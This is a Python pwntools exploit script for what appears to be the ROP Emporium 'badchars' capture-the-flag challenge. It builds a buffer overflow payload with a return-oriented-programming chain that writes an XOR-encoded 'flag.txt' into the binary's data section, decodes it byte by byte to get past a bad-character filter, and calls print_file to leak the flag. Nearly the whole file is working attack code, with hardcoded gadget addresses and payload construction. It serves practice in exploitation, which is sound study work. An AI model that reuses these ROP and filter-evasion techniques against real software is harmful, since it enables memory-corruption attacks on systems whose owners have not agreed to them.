from pwn import *


bad_chars = ['x', 'g' ,'a' ,'.']

# 8 bytes big and writeable, after that comes .bss with null bytes
# move adr by 8 bc without moving adr for xoring x of flag.txt will have 2e in adr (bad char)
data_section_adr = 0x0000000000601028+8


binary = "./badchars"

elf = ELF(binary)

print_file_plt = elf.plt["print_file"]
log.info("print_file_plt: " + hex(print_file_plt) + f" {print_file_plt}")


def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def adjust_to_64_bit(key):
    return pack(key, 8) * 8


def merge_keys(keys):
    result = b""
    for key in keys:
        assert key <= 255
        result += pack(key, 8)
    return result


# x_offset = 5



# def xor_adr_keys(adr, n, keys):
#     chain = b""
#     for key in keys:
#         assert key <= 255
#         key = pack(key, 8)
#         key = key + (b"\x00"*7)
#         log.info(f"key: {key}")
#
#         # GADGETS
#         # r14 -> key, r15 -> adr
#         # 0x00000000004006a0 : pop r14 ; pop r15 ; ret
#         pop_key_and_adr_gadget = 0x00000000004006a0
#         # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
#         xor_one_byte_gadget = 0x0000000000400628
#
#         chain += pack(xor_one_byte_gadget, 64)
#         for i in range(1, n):
#             chain += pack(pop_key_and_adr_gadget, 64)
#             chain += key  # -> r14
#             chain += pack(adr+i, 64)    # -> r15
#             chain += pack(xor_one_byte_gadget, 64)
#     return chain

# key -> one byte
# n -> adr size
def xor_adr(adr, start, n, key):

    log.info("key: " + hex(key) + f" {key}")

    assert key <= 255
    key = adjust_to_64_bit(key)

    log.info(f"key: {key}")

    # GADGETS
    # r14 -> key, r15 -> adr
    # 0x00000000004006a0 : pop r14 ; pop r15 ; ret
    pop_key_and_adr_gadget = 0x00000000004006a0
    # 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
    xor_one_byte_gadget = 0x0000000000400628

    # 0x000000000040062c : add byte ptr [r15], r14b ; ret
    # add_byte_gadget = 0x000000000040062c

    chain = b""

    for i in range(start, n):
        # if i == 6:
        #     chain += pack(pop_key_and_adr_gadget, 64)
        #     addend = adjust_to_64_bit(x_offset)
        #     log.info(f"addend: {addend}")
        #     chain += addend     # -> r14
        #     chain += pack(adr + i, 64)  # -> r15
        #     chain += pack(add_byte_gadget, 64)
        #     continue
        chain += pack(pop_key_and_adr_gadget, 64)
        chain += key  # -> r14
        chain += pack(adr+i, 64)    # -> r15
        chain += pack(xor_one_byte_gadget, 64)
    return chain

# adr is safe
# flag is fucked
# move gadget is safe
# .txt is fucked
def write_to_adr(data, adr):

    assert len(data) == 8

    # GADGETS
    # 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    pop_values_gadget = 0x000000000040069c
    # 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
    move_gadget = 0x0000000000400634


    # WRITE FIRST HALF OF PAYLOAD INTO ADR
    chain = b""
    chain += pack(pop_values_gadget, 64)
    chain += data   # -> r12 (target value)
    chain += pack(adr, 64)   # -> r13 (target adr)
    chain += b"B"*8  # -> r14 (not needed)
    chain += b"C"*8  # -> r15 (not needed)
    chain += pack(move_gadget, 64)
    return chain


def does_contain_bad_char(xored_data):
    global bad_chars
    for bad_char in bad_chars:
        ord_number = ord(bad_char)
        o = bytes(hex(ord_number), "utf-8").replace(b"0x",b"")
        # log.info(f"o: {o}")
        if o in xored_data:
            return True
    return False


# keys = [133, 243, 123, 23, 45, 12, 97, 7]
key = 133
# for key in range(0, 255):
data = b"flag.txt"

assert len(data) == 8

log.info(f"data: {data}")
# merged_key = merge_keys(keys)
#
# log.info(f"merged_key: {merged_key}")
#
# assert len(merged_key) == 8
# xored_data = byte_xor(data, merged_key)

# xored_data = byte_xor(data[:6], adjust_to_64_bit(key))
# xored_data += pack((ord('x')-x_offset), 8)
# xored_data += byte_xor(data[7:], adjust_to_64_bit(key))
xored_data = byte_xor(data, adjust_to_64_bit(key))

if does_contain_bad_char(xored_data):
    log.warn("bad char detected")
    exit(1)

log.info("bad chars: 0x61 (a), 0x78 (x), 0x2e (.), 0x67 (g)")
log.info(f"xored data: {xored_data}")

assert len(xored_data) == 8

payload = b""
payload += b"A"*(54-8-2-4)
payload += write_to_adr(xored_data, data_section_adr)
payload += xor_adr(data_section_adr, 0, 8, key)
# payload += xor_adr(data_section_adr, 6, 7, key2)

# call function
# rdi holds first arg
# 0x00000000004006a3 : pop rdi ; ret
payload += pack(0x00000000004006a3, 64)
payload += pack(data_section_adr, 64)
payload += pack(print_file_plt, 64)
payload += b"B"*8   # ret


write("/tmp/docgil", payload)

p = process([binary])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall()
log.info(f"flag: {flag}")
# if b"Failed" in flag:
#     continue
# else:
#     break